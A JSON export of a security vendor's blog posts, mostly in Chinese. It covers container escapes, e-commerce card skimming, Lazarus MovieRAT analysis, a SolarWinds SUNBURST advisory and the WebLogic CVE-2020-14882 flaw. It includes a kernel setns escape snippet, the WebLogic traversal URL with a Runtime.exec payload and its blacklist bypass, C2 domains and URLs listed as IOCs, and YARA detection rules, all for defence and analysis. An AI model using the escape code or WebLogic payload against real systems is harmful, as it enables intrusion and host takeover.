\"/proc/1/ns/mnt\", O_RDONLY, 0);\n        ((_sys_setns)(SYS_SETNS))( fd, 0);\n\n        fd      = ((_do_sys_open)(DO_SYS_OPEN))( AT_FDCWD, \"/proc/1/ns/pid\", O_RDONLY, 0);\n        ((_sys_setns)(SYS_SETNS))( fd, 0);\n}\n```\n\n這篇的作法是開啟 `/proc/1/ns/` 資料夾下的檔案，也就是 Namesapces 提供的各個部件（這邊選擇 `mnt` 與 `pid`），然後呼叫 `setns` 把自己的 Namespaces 設定成跟 Host 一樣，這樣就不用額外的步驟，可以直接存取 Host！\n\n<br/>\n\n## Mitigation\n\n上述說到的 Privileged container 是最容易 Escape 的 Container ，若一定得使用它開服務的話，要把它當作 Host 的服務看待，做好權限管理，只要駭客沒有足夠的權限（ `root` ），就不能使用 `mount` 的方式存取 Host 資源，大幅降低它所造成的危害。Docker 可以用 `docker run -u {uid}:{gid}`，以較低的使用者權限開啟 Container，然後把要開啟的服務放在一般使用者可用的 `port >= 1024` 上，這麼一來就算駭客打下服務，也沒有足夠的權限使用 `mount` 做進一步的攻擊：\n\n```\n# docker run --privileged -it -u 1000 python bash\nI have no name!@6b6f0f0bc93d:/$ python -m http.server 8080 &\n[1] 7\nI have no name!@6b6f0f0bc93d:/$ Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...\n\nI have no name!@6b6f0f0bc93d:/$ ps aux\nUSER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n1000         1  0.1  0.0   5748  3632 pts/0    Ss   02:51   0:00 bash\n1000         7  4.0  0.1  25996 18840 pts/0    S    02:51   0:00 python -m http.server 8080\n1000         8  0.0  0.0   9388  3100 pts/0    R+   02:51   0:00 ps aux\nI have no name!@6b6f0f0bc93d:/$ mkdir /tmp/t1; mkdir /tmp/t2; mount --bind /tmp/t1 /tmp/t2\nmount: only root can use \"--bind\" option\n```\n\n也可以善用 `setuid`，切換到權限較低的使用者。剩下的就是定期更新、檢查使用的產品是否出現漏洞，以及避免使用不再維護的產品。\n\n<br/>\n\n## Container security is Linux security\n\nContainer 仰賴 Linux kernel 提供的機制，隔離出一塊空間供 Container 使用，所以當這些機制出現問題或開發者設計時沒有考慮周全，原以為安全的 Container 就有可能被駭客利用，造成更大的危害。今天分別介紹 Privileged Container、Container Engine bug 以及 Linux kernel exploit 這三種攻擊情境，都是利用 Linux 本身的特性達到存取 Host 資源的效果。希望你們會喜歡，也祝各位都能成功 Escape！\n\n<br/>\n\n## References\n\n* [Breaking Out of rkt – 3 New Unpatched CVEs](https://unit42.paloaltonetworks.com/breaking-out-of-coresos-rkt-3-new-cves/)\n* [The Route to Root: Container Escape Using Kernel Exploitation](https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation)\n* [An Exercise in Practical Container Escapology](https://capsule8.com/blog/practical-container-escape-exercise/)\n* [CVE-2019-5736: Escape from Docker and Kubernetes containers to root on host](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)\n* [A Compendium of Container Escapes](https://i.blackhat.com/USA-19/Thursday/us-19-Edwards-Compendium-Of-Container-Escapes-up.pdf)\n* [Linux Container Escapes and Hardening](https://gist.github.com/FrankSpierings/5c79523ba693aaa38bc963083f48456c)\n* [Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)\n\n<br/>","createdAt":"2020-09-08T07:57:40.695Z","updatedAt":"2020-09-16T03:14:35.146Z","__v":0,"id":"5f573974531f77004b1a31ff"}],"createdAt":"2020-09-08T07:57:40.608Z","updatedAt":"2021-01-27T04:41:08.603Z","__v":1,"author":"5eeadf2c163518003f86d911","topic":"5ecaa004a792d70040a0d8b0","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1599804537/emergency-exit-1321134_1920_6420b1abb7.jpg","id":"5f573974531f77004b1a31fe"},{"publish":true,"enable_form":false,"tags":["5fb1db587f8d95003fe7dad5","5fb479dd7f8d95003fe7db53","5fb1db737f8d95003fe7dad6","5ecf8907fedd7f004b26978d","5ecf8852fedd7f004b269789"],"relative_posts":[],"_id":"5fab40b27f8d95003fe7dab2","post_url":"e-commerce-security-a-case-study-on-credit-card-data-breaches","publish_date":"2020-11-18T02:00:00.000Z","post_name":"打倒夢靨！電子商務安全不再沉睡！！信用卡與個資竊取案例分析","contents":[{"locale":"tw","_id":"5fac956e7f8d95003fe7dab3","title":"打倒夢靨！電子商務安全不再沉睡！！信用卡與個資竊取案例分析","context":"By Jason3e7 | 圖片來源：[Pixabay](https://pixabay.com/vectors/lock-security-credit-card-5459714/)\n\n## 前言\n\n近期於台灣發生多起信用卡盜刷事件，TeamT5 追蹤到幾起事件後深入調查，並於本文揭露側錄技術，以促進電商資訊安全，保護消費者的權益。\n\n## 技術分析\n\nTeamT5 分析近期數起信用卡盜刷事件，發現過往手法多為攻擊網站後再行 Dump Database，新的手法為存入資料庫之前，於前端程式或後端程式去側錄機敏資訊，以下將以知名 ASP.NET 平台的 CMS，DNN（DotNetNuke）作為範例，以前端與後端的攻擊手法分別說明。\n\n- **後端程式側錄**\n\n  利用高隱匿性的 IIS module，透過修改 config 被 IIS 載入後執行，可於該網站任意頁面側錄資訊。\n經過一段時間收集機敏資訊後，攻擊者再透過其他後門程式，定期將機敏資訊帶走，清除蹤跡。\n\n  運作原理拆解如下：\n\n\n 1. IIS web.config 被新增一行資料以啟用新的 module（LoggerModule）\n![202011-1](https://res.cloudinary.com/dvgomg5gh/image/upload/v1605146682/202011-1_6a6e70e4b2.jpg)\n 2. 於 bin 資料夾底下也新增檔案 System.Logger.dll\n![202011-2](https://res.cloudinary.com/dvgomg5gh/image/upload/v1605146684/202011-2_15be0c2208.jpg)\n 3. 反編譯 System.Logger.dll 之後，檢查內容發現 module 利用 Application_BeginRequest 的特性，於網站每個頁面執行前，執行側錄程式，故不管哪個頁面的機敏資訊都能側錄。\n![202011-3](https://res.cloudinary.com/dvgomg5gh/image/upload/v1605146681/202011-3_ebd6f3620b.jpg)\n 4. 側錄過程於後端接收，故前端無法察覺\n![202011-4](https://res.cloudinary.com/dvgomg5gh/image/upload/v1605146681/202011-4_1b178ba603.jpg)\n 5. 側錄資訊\n![202011-5](https://res.cloudinary.com/dvgomg5gh/image/upload/v1605146680/202011-5_bc97ae7951.jpg)\n\n<br>\n\n- **前端程式側錄**\n\n  利用網站前端複雜的載入資源匿蹤，透過插入 javascript 於前端載入後執行，可於載入頁面側錄資訊。\n\n  攻擊者可直接轉拋機敏資訊到遠端主機，或者於網站建立收集器，經過一段時間收集機敏資訊後，再透過其他後門程式，將機敏資訊帶走，清除蹤跡。\n\n  運作原理拆解如下：\n\n\n  1. 插入 JavaScript 到側錄機敏資訊頁面中，任意可載入資源的位置，在 http_server 設定接收主機（外部直接轉拋或內部隱匿留存），如下圖。\n![202011-6](https://res.cloudinary.com/dvgomg5gh/image/upload/v1605146681/202011-6_33f67394c9.jpg)\n\n  2. 如利用後端收集器接收，可參考下列圖片\n![202011-7](https://res.cloudinary.com/dvgomg5gh/image/upload/v1605146684/202011-7_9904abacc1.jpg)\n\n  3. 網站前端載入資源複雜，不易察覺\n![202011-8](https://res.cloudinary.com/dvgomg5gh/image/upload/v1605146692/202011-8_d2c677c5c1.jpg)\n\n  4. 側錄資訊\n![202011-9](https://res.cloudinary.com/dvgomg5gh/image/upload/v1605146691/202011-9_ccfef7c3ab.jpg)\n\n<br>\n\n## 影響與建議\n\n* 自動化或定期檢查程式碼是否被竄改，並做好版本控管\n* 透過 TeamT5 [ThreatSonar](https://teamt5.org/tw/products/threatsonar/) 檢查是否有攻擊者活動跡象\n  * 檢查是否有後門程式、webshell\n  * 是否有可疑連線 C2\n* 使用以下 yara rule 掃描網站目錄，檢查是否存在側錄模組\n\n```\nrule IIS_Module_sniffer\n{\n\tmeta:\n\t\tauthor = \"jason3e7\"\n\t\tdescription = \"detect IIS module sniffer\"\n\t\tdate = \"20201110\"\n\tstrings:\n\t\t$c0 = \"IHttpModule\" wide ascii\n\t\t$c1 = \"Application_BeginRequest\" wide ascii\n\t\t$c2 = \"Request\" wide ascii\n\t\t$c3 = \"Form\" wide ascii\n\t\t$c4 = \"StreamWriter\" wide ascii\n\t\t$c5 = \"WriteLine\" wide ascii\n\t\t$c6 = \"Write\" wide ascii\n\tcondition:\n\t\t$c0 and $c1 and ($c2 and $c3) and $c4 and ($c5 or $c6) \n}\n```\n\n<br>","createdAt":"2020-11-12T01:52:46.370Z","updatedAt":"2020-11-18T01:34:33.061Z","__v":0,"id":"5fac956e7f8d95003fe7dab3"}],"createdAt":"2020-11-11T01:38:58.079Z","updatedAt":"2020-12-16T01:47:55.087Z","__v":0,"author":"5eeae43e163518003f86d914","topic":"5ecaa004a792d70040a0d8b0","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1605149028/lock-5459714_b5a77d6d01.png","id":"5fab40b27f8d95003fe7dab2"},{"publish":true,"enable_form":false,"tags":["5ecf890dfedd7f004b26978e","5fd6bb15af135000464926d8","5fd6bb1daf135000464926d9","5fd6bb3aaf135000464926db","5fd6bb25af135000464926da"],"relative_posts":["5f301d4c163518003f86da78"],"_id":"5fd1cef79f8bdc004a7fdf4a","post_url":"north-korea-linked-lazarus-apt-uses-a-macos-malware-in-cryptocurrency-exchange-attack","post_name":"macOS 用戶當心！北韓駭客 Lazarus 將目標瞄準虛擬貨幣交易用戶","publish_date":"2020-12-22T01:00:00.000Z","contents":[{"locale":"tw","_id":"5fd1cef89f8bdc004a7fdf4b","context":"圖片來源：[Pixabay](https://pixabay.com/illustrations/the-company-cryptocurrency-mining-3338207/)\n\n## 摘要\nTeamT5 近期掌握情資，北韓 APT 駭客 Lazarus 開發出 macOS 作業系統的惡意程式 MovieRAT，並試圖攻擊虛擬貨幣的使用者，藉此盜取帳戶內的虛擬貨幣。\n\n## 技術分析\nTeamT5 透過情資管道取得惡意樣本（53d9af8829a9c7f6f177178885901c01），其檔案名稱為 Esilet.dmg，是 macOS 的第三方應用程式安裝檔，如圖一所示。該樣本執行後，會連線至 esilet.com 網站，該網站為虛擬貨幣交易平台，但經過 TeamT5 深入追查後發現，esilet.com 於 2020 年 6 月 12 日註冊，因此可以確認為駭客近期所發動的攻擊行為，如圖二所示。\n\n![2020-12-1](https://res.cloudinary.com/dvgomg5gh/image/upload/v1607910258/2020-12-1_38f3073f52.png)\n_圖一、Esilet.dmg 執行畫面_\n\n<br>\n\n![2020-12-2](https://res.cloudinary.com/dvgomg5gh/image/upload/v1607909875/2020-12-2_61901a7ea4.png)\n_圖二、esilet.com 網域註冊時間_\n\n<br>\n\nesilet.com 是駭客特意架設的虛擬貨幣交易網站，並透過該網站的應用程式下載安裝連結來散佈惡意程式。根據網站的支援語系，推測駭客攻擊標的為英、法、德及中文的虛擬貨幣用戶，如圖三所示。\n\n<br>\n\n![2020-12-3](https://res.cloudinary.com/dvgomg5gh/image/upload/v1607909876/2020-12-3_c882e11ea8.png)\n_圖三、esilet.com 支援英、法、德及中文語系_\n\n<br>\n\nEsilet.dmg 執行後，會和中繼站連線獲取 config，config 的連線特徵為 \"C2 + /update/ + {platform}.json\"，故 macOS 版本的 config 下載連結為 \"ht<span>tps://</span>esilet[.]com/update/darwin.json\"。所下載的惡意程式經過 UPX 加殼，會存放於系統的暫存目錄後執行。經過分析，該惡意程式的通訊協議和 MoiveRAT 相同，故確定此惡意樣本是由 MovieRAT 改寫的變種程式。\n\n<br>\n\n![2020-12-4](https://res.cloudinary.com/dvgomg5gh/image/upload/v1607909876/2020-12-4_e77cf3db22.png)\n_圖四、Esilet.dmg 下載 MovieRAT 的逆向分析截圖_\n\n<br>\n\n當 MovieRAT 成功執行後，其嘗試加入 Launch Daemons/Services，將 property lists 檔案 com.applex.services.agent.agent.plist 放置於 {HomeDirectory}/Library/LaunchAgents 目錄，若寫入失敗則會寫入至 /Library/LaunchDaemons 之中，藉此達到開機後惡意程式自動執行的持續控制手法，如圖五所示。\n\n<br>\n\n![2020-12-5](https://res.cloudinary.com/dvgomg5gh/image/upload/v1607909875/2020-12-5_82214f3ea6.png)\n_圖五、將 plist 寫入開機執行設定之中_\n\n<br>\n\n其所連線的中繼站位址為固定並寫死（Hard Coding）於程式中，分別為 infodigitalnew.com、www.vinoymas.ch 及 sche-eg.org，如圖六所示。\n\n<br>\n\n![2020-12-6](https://res.cloudinary.com/dvgomg5gh/image/upload/v1607909875/2020-12-6_a9d7f08bae.png)\n_圖六、惡意中繼站位址寫死於程式碼中_\n\n<br>\n\n樣本連線至中繼站後，駭客將會傳遞不同的指令碼（Command Code），樣本取得指令後會執行對應的動作，如上傳/下載檔案、指令執行及檔案/資訊回傳等，詳細資訊如圖七及表一所示。\n\n<br>\n\n![2020-12-7](https://res.cloudinary.com/dvgomg5gh/image/upload/v1607909880/2020-12-7_12bab7ef9f.png)\n_圖七、指令碼逆向分析結果_\n\n<br>\n<br>\n\n| 指令碼 | 描述 |\n| -- | -- |\n| 0x21279E | 從中繼站下載檔案並存放於特定路徑 | \n| 0x2AFCB2 | 取得主機資訊 |\n| 0x38CE55 | Heartbeat |\n| 0x3A65F8 | 字串(string)轉換為數字(integer) |\n| 0x3A6A93 | 傳送HTTP封包至中繼站 |\n| 0x3B187D | 空指令 |\n| 0x484B81 | 上傳檔案至中繼站 |\n| 0x48C82A | 透過HTTP從中繼站下載檔案|\n| 0x48D6FC | 執行指令(新加入的指令碼)|\n| 0x7FC0A4 | 執行指令並回傳結果 |\n\n_表一、指令碼清單_\n\n<br>\n\nTeamT5 經由該樣本關聯至 MovieRAT 後門程式，MovieRAT 是個輕量化的後門控制程式，支援最基本的檔案上傳/下載、指令執行及程序操作等功能。通常被駭客用於成功入侵後的第二階段控制（2nd-stage RAT）之用。先前所掌握的 MovieRAT 後門為 Windows 惡意程式，會透過 HTTP 通訊協定與中繼站連線，所使用的 Cookie 具有特定格式。\n\n根據 TeamT5 的情資，將 MovieRAT 定位到駭客組織 Lazarus 身上。Lazarus 為北韓的駭客族群，擁有多起攻擊金融產業的紀錄，尤其特別針對 SWIFT 跨國轉帳交易系統和 ATM 自動櫃員機系統進行攻擊。推測為了替北韓政權籌措資金，好發展武器與實驗，故多選擇金融產業和具有關鍵技術的私人企業進行攻擊。過往的攻擊行動中，會在惡意程式內參雜俄文，企圖混淆分析人員。近期則是開始大量入侵攻擊虛擬貨幣交易所，如 Bithumb、Youbit 及 Yapizon 等，造成上百萬美元的金額損失。\n\n## IOCs（惡意攻擊指標）\n\n|IOC|類型|\n|-|-|\n|53d9af8829a9c7f6f177178885901c01|MD5|\n|ae9f4e39c576555faadee136c6c3b2d358ad90b9|SHA1|\n|9ba02f8a985ec1a99ab7b78fa678f26c0273d91ae7cbe45b814e6775ec477598|SHA256|\n|9578c2be6437dcc8517e78a5de1fa975|MD5|\n|d2a77c31c3e169bec655068e96cf4e7fc52e77b8|SHA1|\n|dced1acbbe11db2b9e7ae44a617f3c12d6613a8188f6a1ece0451e4cd4205156|SHA256|\n|esilet.com|Domain|\n|www.kurunzi.news|Domain|\n|oasismagazine.africa|Domain|\n|lerenmetsara.net|Domain|\n|ht<span>tps://</span>infodigitalnew.com/wp-content/plugins/top.php |URL|\n|ht<span>tps://</span>www.vinoymas.ch/wp-content/plugins/top.php |URL|\n|ht<span>tps://</span>sche-eg.org/plugins/top.php |URL|\n\n## 影響與建議\n\n 1. 透過 TeamT5 [ThreatSonar](https://teamt5.org/tw/products/threatsonar/) 檢查是否有攻擊者活動跡象，ThreatSonar 支援 Windows、Linux 及 macOS 作業系統。\n 2. 使用以下 yara rule 掃描主機系統，檢查是否存在 MovieRAT 後門程式。\n\n ```\n rule TeamT5_Lazarus_MovieRAT\n {\n     meta:\n         author        = \"TeamT5\"\n         description   = \"Lazarus - MovieRAT\"\n     strings:\n         $cookie = \"Cookie: _ga=%s%02d%d%d%02d%s; gid=%s%02d%d%03d%s\" fullword\n         $str_1 = \"GA1.%d.\" fullword\n         $str_2 = \".%d%05d%04d\" fullword\n     condition:\n         all of them\n }\n ```\n \n ![2020-12-8](https://res.cloudinary.com/dvgomg5gh/image/upload/v1607909882/2020-12-8_34a68e7370.png)\n\n 3. 可將前述的 IOC 清單匯入既有的資安設備中，進行偵測阻擋防禦之用。\n 4. 更多 APT 駭客族群資訊，可參考 TeamT5 [ThreatVision](https://teamt5.org/tw/products/threatvision/) 情資平台。\n\n<br>\n","title":"macOS 用戶當心！北韓駭客 Lazarus 將目標瞄準虛擬貨幣交易用戶","createdAt":"2020-12-10T07:32:08.061Z","updatedAt":"2020-12-15T06:48:21.344Z","__v":0,"id":"5fd1cef89f8bdc004a7fdf4b"}],"createdAt":"2020-12-10T07:32:07.952Z","updatedAt":"2021-01-27T04:40:39.817Z","__v":1,"author":"5eeae43e163518003f86d914","topic":"5ecaa004a792d70040a0d8b0","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1607585599/the-company-3338207_1920_61abdf84cd.jpg","id":"5fd1cef79f8bdc004a7fdf4a"},{"publish":true,"enable_form":false,"tags":["5ecf88fdfedd7f004b26978c","5fd96706542153003465f6fc","5fd9671d542153003465f6fd","5fd96738542153003465f6fe","5ecf8852fedd7f004b269789"],"relative_posts":["5f3fdeb5163518003f86dad5"],"_id":"5fd95f48542153003465f6e3","post_url":"teamt5-security-alert-report-solarwinds-orion-vulnerability-being-actively-exploited","publish_date":"2020-12-16T02:00:00.000Z","post_name":"TeamT5 安全性通報－知名 IT 監控平臺 SolarWinds Orion 證實遭供應鏈攻擊","contents":[{"locale":"tw","_id":"5fd95f48542153003465f6e4","title":"TeamT5 安全性通報－知名 IT 監控平臺 SolarWinds Orion 證實遭供應鏈攻擊","context":"圖片來源：[Pixabay](https://pixabay.com/photos/trojan-trojananisches-horse-craft-1700378/)\n\n##### *知名 IT 監控平臺 SolarWinds 淪陷，近期已有多個採用該平臺的組織遭到攻擊*\n\n## 說明\n\nSolarWinds 在今年 3 月到 6 月間釋出 2019.4 HF 5 至 2020.2.1 版本的 SolarWinds Orion Platform 遭到駭客供應鏈攻擊，導致服務存在遠端執行後門程式，公開情資指出，這是來自俄羅斯攻擊族群 APT29 的針對性攻擊行動。\n\nSolarWinds 已進行修補並釋出 Orion Platform 2020.2.1 HF 1，預計在 12 月 15 日釋出 2020.2.1 HF 2，建議各單位在 2020.2.1 HF 2 釋出後立即更新，此一版本不只修補了有問題的元件，也進一步提供安全措施。\n\nFireEye 日前公布遭受駭客攻擊，提供的公開情資包含 SolarWinds 相關元件（SolarWinds.Orion.Core.BusinessLayer.dll），TeamT5 取得樣本並分析其中的惡意程式 SUNBURST。\n\n![201215通報-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1608081281/201215_1_207508801e.png)\n_圖一、惡意程式的 Job Class 提供各種操作指令_\n\n![201215通報-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1608081281/201215_2_b31cd3e1e9.png)\n_圖二、透過 HTTP 和 Orion Improvement Program（OIP）傳輸指令_\n\n<br>\n\n## 受影響的版本\n\n- SolarWinds Orion Platform 2019.4 HF 5\n- SolarWinds Orion Platform 2020.2 – 2020.2 HF 1\n\n## 修補與防範建議\n\n- 隔離 Orion server 直到 [SolarWinds](https://customerportal.solarwinds.com) 提供修補程式並安裝\n- 於 ThreatSonar 檢查是否有使用 SolarWinds\n\n  1. 點擊威脅狩獵功能\n  2. 點擊 Certificates\n  3. 搜尋 SolarWinds 的憑證 thumbprint，搜尋語法：\n\n      thumbprint = 47D92D49E6F7F296260DA1AF355F941EB25360C4\n\n  4. 點擊 Obj Cnt.下方數字，檢查是否有包含 Orion 名稱的項目\n\n![201215通報-3.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1608081281/201215_3_88a79a1fec.png)\n_圖三、威脅狩獵功能搜尋 SolarWinds 的憑證_\n\n![201215通報-4.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1608081281/201215_4_5a8fdda638.png)\n_圖四、搜尋 Orion 確認是否存在相關檔案_\n\n<br>\n\n## FireEye 公開的 IoC 資訊\n\n- 中繼站 Domain 以及 IP\n\n<br>\n\n|IOC|類型|\n|----|----|\n|avsvmcloud[.]com|Domain|\n|freescanonline[.]com|Domain|\n|deftsecurity[.]com|Domain|\n|thedoccloud[.]com|Domain|\n|websitetheme[.]com|Domain|\n|highdatabase[.]com|Domain|\n|incomeupdate[.]com|Domain|\n|databasegalore[.]com|Domain|\n|panhardware[.]com|Domain|\n|zupertech[.]com|Domain|\n|13.59.205[.]66|IP Address|\n|54.193.127[.]66|IP Address|\n|54.215.192[.]52|IP Address|\n|34.203.203[.]23|IP Address|\n|139.99.115[.]204|IP Address|\n|5.252.177[.]25|IP Address|\n|5.252.177[.]21|IP Address|\n|204.188.205[.]176|IP Address|\n|51.89.125[.]18|IP Address|\n|167.114.213[.]199|IP Address|\n\n\n- 檔案 Hash（MD5）\n\n|IOC|類型|\n|----|----|\n|02af7cec58b9a5da1c542b5a32151ba1|MD5 Hash|\n|08e35543d6110ed11fdf558bb093d401|MD5 Hash|\n|2c4a910a1299cdae2a4e55988a2f102e|MD5 Hash|\n|846e27a652a5e1bfbd0ddd38a16dc865|MD5 Hash|\n|b91ce2fa41029f6955bff20079468448|MD5 Hash|\n|4f2eb62fa529c0283b28d05ddd311fae|MD5 Hash|\n|56ceb6d0011d87b6e4d7023d7ef85676|MD5 Hash|\n\n\n## 參考資料\n\n- https://www.solarwinds.com/securityadvisory\n- https://www.cert.govt.nz/it-specialists/advisories/solarwinds-orion-vulnerability-being-actively-exploited/\n- https://www.ithome.com.tw/news/141651\n- https://github.com/fireeye/sunburst_countermeasures\n \n<br>\n","__v":0,"id":"5fd95f48542153003465f6e4"}],"createdAt":"2020-12-16T01:13:44.571Z","updatedAt":"2021-01-27T04:40:55.492Z","__v":1,"author":"5eeae43e163518003f86d914","topic":"5ecaa004a792d70040a0d8b0","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1608084831/trojan_1700378_1920_7590bb01ea.jpg","id":"5fd95f48542153003465f6e3"},{"publish":true,"enable_form":false,"tags":["5ffd1086c56e80003f985958","5ffd1093c56e80003f985959","5ffd109dc56e80003f98595a","5ed467b5165e5f006fa403fc"],"relative_posts":["5ee07e4bbf58af004a154155"],"_id":"5ffd4148c56e80003f98595c","post_name":"年度最慘漏洞！深入探究 Oracle WebLogic CVE-2020-14882","post_url":"most-epic-fail-vulnerability-research-on-oracle-weblogic-cve-2020-14882","publish_date":"2021-01-13T02:00:00.000Z","contents":[{"locale":"tw","_id":"5ffd4148c56e80003f98595d","title":"年度最慘漏洞！深入探究 Oracle WebLogic CVE-2020-14882","context":"圖片來源：[Pixabay](https://pixabay.com/photos/toys-pony-my-little-pony-horse-4968006/)\n\n## 緣起\n\nWebLogic 是美商 Oracle 的主要產品之一，係商業市場上主要的 Java（J2EE）應用伺服器軟體（application server）之一。於 2020 年爆出高風險漏洞 CVE-2020-14882 與 CVE-2020-14883，其中，CVE-2020-14882 的 CVSS 3.1 評分更高達 9.8，屬於嚴重（Critical）等級之漏洞。\n\n攻擊者可利用漏洞，組合惡意指令，使未經授權的請求繞過 WebLogic 後台登入等限制，最終可以遠端執行代碼攻擊（Remote Code Execution），因此攻擊者可輕易的利用此漏洞發起攻擊。\n\n<br>\n\n## 技術分析\n\n我們從下圖的漏洞 POC 範例開始看起。\n\n![blog_2101-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1610433541/blog_2101_1_7add5099fd.png)\n_圖一、POC 攻擊範例_\n\n<br>\n\n首先 WebLogic 會對 url 進行檢查，當攻擊者試圖存取 console 路徑底下的檔案資源時（階段 A），會將其 url 與 WebLogic 設定檔（web.xml）內的網頁資源路徑進行比對，若該 url 屬於任一資源路徑，將不須驗證即可進行資源存取（階段 B）。其 web.xml 的檔案路徑為 wlserver/server/lib/consoleapp/webapp/WEB-INF/web.xml，如下圖所示。\n\n![blog_2101-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1610433541/blog_2101_2_b9ab148ed5.png)\n_圖二、web.xml 內容_\n\n<br>\n\n再來，```http://127.0.0.1:7001/console/images/%252E%252E%252Fconsole.portal``` 會先進行一次 url decode，將 %25 轉成 %，所以該 url 會變成 ```http://127.0.0.1:7001/console/images/%2E%2E%2Fconsole.portal```（階段 C）。\n\n但是在 UIServletInternal.getTree 函式中，WebLogic 又會做再一次 url decode，將 %2E%2E%2F 轉為 ../，於是 url 變成```http://127.0.0.1:7001/console/images/../console.portal```，且後續的操作中 WebLogic 都沒有對路徑進行權限檢查，所以產生了跨目錄穿越攻擊（Directory Traversal）的漏洞。\n\nWebLogic Server 處理後台管理（console）的請求時，會呼叫 BreadcrumbBacking().init 函式進行處理（階段 D）。當 url 中含有 handle 參數時，會將 handle 拆解成 class 和 argument。以 POC 為例，class 就會是 ```com.tangosol.coherence.mvel2.sh.ShellSession()```（階段 E），argument 則是 ```\"java.lang.Runtime.getRuntime().exec(%27whoami%27);\"```（階段 F）。\n\n後續，會將 argument 傳給 class 的 constructor ，而 ShellSession 函式會再把 argument 傳給 MVELInterpretedRuntime 函式中，最後透過反射執行 argument 中內含的惡意指令，也就是 POC 範例中的 whoami。\n\n<br>\n\n## 修補插曲\n\n但僅憑跨目錄穿越攻擊、Unauthorized RCE 等問題，何以稱之為「年度最慘漏洞（Most Epic Fail）」？\n\nOracle 於 2020 年 10 月釋出修補程式，但細究其修補的方法，發現 Oracle 利用黑名單的方式過濾 url 參數，如下圖所示。\n\n![blog_2101-3.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1610433542/blog_2101_3_67ba9cf2c5.png)\n_圖三、Oracle 透過黑名單修補 CVE-2020-14882_\n\n<br>\n\n#### 利用黑名單方式過濾，會有什麼問題呢？\n\n只要利用不在黑名單內的 %252e%252e，就可以成功繞過（Bypass）已修補程式中的 url 檢查。\n\n眾多安全研究人員於短時間內發現該問題並通報 Oracle，該漏洞也被編號為 CVE-2020-14750，如下圖所示。此錯誤的漏洞修補方式，也使得 CVE-2020-14882 成功入圍 2020 年 [Pwnie Award Most Epic Fail](https://pwnies.com/nominations/active/most-epic-fail/oracle-weblogic-server-co-oracle/) 項目。\n\n![blog_2101-4.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1610433541/blog_2101_4_677f062e72.png)\n_圖四、眾多研究員回報 CVE-2020-14750_\n\n<br>\n\n漏洞修補是一門深奧的學問，以 CVE-2020-14882 為例，其成因包含對檔案路徑存取控管不確實、對路徑做兩次的 url decode 及後台管理程式提供代碼執行。但 Oracle 一開始只修補兩次的 url decode 問題，更不用說其修補的方式為黑名單限制。因漏洞修補不確實而產生了更多的漏洞，所以不可不慎。\n\n<br>\n\n## 影響層面\n\n攻擊者利用此漏洞互相搭配，不須登入即可遠端指令執行，進而產生憑證竊取（Credential Dump）、橫向移動（Lateral Movement）等攻擊行為。\n\n- 受影響產品：WebLogic Server\n- 受影響版本：10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0、14.1.1.0.0\n\n<br>\n\n## 防護建議\n\n- 更新 Oracle 官方最新修正 [patch](https://www.oracle.com/security-alerts/cpuoct2020.html)。\n- 惡意 payload 檢查，例如檢查 console.portal 和 payload 是否帶有 ```handle=...``` 參數，或是直接關閉 console.portal 和 payload 的 handle 功能。\n- 匯入以下 Yara 偵測規則，確認是否存在利用該漏洞的惡意程式。\n\n```\nrule CVE_2020_14882 {\n    meta:\n        author = \"TeamT5\"\n        description = \"CVE-2020-14882 exploit\"\n    strings:\n        $resource1 = \"console/bea-helpsets/\"\n        $resource2 = \"console/framework/skins/wlsconsole/images/\"\n        $resource3 = \"console/framework/skins/wlsconsole/css/\"\n        $resource4 = \"console/framework/skins/wlsconsole/js/\"\n        $resource5 = \"console/framework/skeletons/wlsconsole/css/\"\n        $resource6 = \"console/framework/skeletons/wlsconsole/js/\"\n        $resource7 = \"console/css/\"\n        $resource8 = \"console/common/\"\n        $resource9 = \"console/images/\"\n\n        $console1 = \"console.portal\"\n        $console2 = \"consolejndi.portal\"\n        \n        $handle = \"handle=\"\n\n    condition:\n        any of ($resource*) and 1 of ($console*) and $handle\n}\n```\n\n![blog_2101-5.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1610433541/blog_2101_5_8a00e312e3.png)\n_圖五、透過 Yara 偵測規則可有效偵測 CVE-2020-14882 exploit_\n\n<br>\n","__v":0,"id":"5ffd4148c56e80003f98595d"}],"createdAt":"2021-01-12T06:27:20.923Z","updatedAt":"2021-01-13T02:33:44.217Z","__v":1,"author":"5ff54e5ec56e80003f985956","topic":"5ecaa004a792d70040a0d8b0","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1610441497/toys_4968006_1920_454e3e5929.jpg","id":"5ffd4148c56e80003f98595c"},{"publish":true,"enable_form":false,"tags":["6018b953c56e80003f9859cb","6018ccf4c56e80003f9859cc"],"relative_posts":[],"_id":"6017c9aac56e80003f9859ba","post_url":"a-deep-dive-into-powershell-s-constrained-language-mode","post_name":"A Deep Dive into PowerShell's Constrained Language Mode","contents":[{"locale":"en","_id":"6017c9aac56e80003f9859bb","title":"A Deep Dive into PowerShell's Constrained Language Mode","context":"*Image courtesy of [Pexels](https://www.pexels.com/zh-tw/photo/3803517/)\n\n## What is Constrained Language Mode and Why it Matters\n\nWhen PowerShell was [first announced in 2006](https://betanews.com/2006/11/14/windows-powershell-1-0-released/), it was meant to be a flexible command-line shell that features an easy-to-understand yet advanced scripting engine for IT admins. Fast forward to (almost) a decade and a half later, PowerShell has caught up in popularity and has superseded the now-legacy `cmd.exe` in current Windows 10 